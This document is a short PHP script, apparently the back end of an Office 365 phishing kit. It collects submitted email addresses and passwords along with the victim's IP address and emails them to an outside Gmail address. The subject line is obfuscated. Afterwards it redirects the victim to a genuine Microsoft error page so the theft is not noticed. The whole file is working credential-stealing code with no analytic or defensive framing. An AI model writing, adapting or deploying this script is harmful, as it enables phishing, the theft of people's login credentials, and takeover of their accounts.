<?php
if($_POST["S401"] != "" and $_POST["S402"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "\n";
$message .= "Email: ".$_POST['S401']."\n";
$message .= "pass: ".$_POST['S402']."\n";
$message .= "\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "\n";
$message .= "\n";
$message .= "\n";
$send = "lordslogs@gmail.com";
$subject = " Oflfic//e | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: https://support.office.com/en-us/article/-something-went-wrong-error-when-you-try-to-start-an-office-app-4b4471dd-cf86-4a37-910d-35a01a6c7d17");
}

?>